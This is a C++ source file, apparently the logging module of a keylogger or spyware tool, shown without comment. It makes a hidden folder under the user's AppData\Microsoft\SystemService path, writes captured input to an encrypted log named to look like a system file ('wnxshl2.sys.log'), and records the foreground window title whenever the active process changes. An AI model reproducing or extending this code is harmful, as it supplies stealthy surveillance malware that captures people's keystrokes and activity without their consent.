#include "stream.h"
#include <iostream>

#define APPDATA "APPDATA"

std::string Stream::GetPath(const std::string &dir) {
  char *buf = nullptr;
  size_t size = 0;
  std::string finalDir;

  if (_dupenv_s(&buf, &size, APPDATA) == 0 && buf != nullptr) {
	finalDir = buf;
  }
  finalDir += dir;
  free(buf);
  return finalDir;
}

bool Stream::MakeDir(const std::string &path) {
  bool ret = CreateDirectoryA(path.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
  SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
  return ret;
}

bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blockProcessInfo) {
  bool processInfo = false;
  uint32_t cur = SystemData::GetProcessId();
  if (SystemData::ProcessChanged(active, cur, true)) {
	processInfo = true;
  }

  logFile->Ofstream.open(logFile->PathFull, std::fstream::app);
  if (!logFile->Ofstream.is_open()) {
	return false;
  }
  if (processInfo && !blockProcessInfo) {
	std::string timeString =
		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
	Crypt::Encrypt(timeString);
	Crypt::Decrypt(timeString);
	logFile->Ofstream << timeString;
  }
  std::string cryptInput = input;
  Crypt::Encrypt(cryptInput);
  logFile->Ofstream << cryptInput;
  logFile->Ofstream.close();
  return true;
}
bool Stream::MakeFile() {
  try {
	logFile = new Stream::LogFile(Stream::GetPath(R"(\Microsoft\SystemService\)"), "wnxshl2.sys.log");
  } catch (...) {
	return false;
  }
  return true;
}
bool Stream::GetAccountInfo() {
  return false;
}
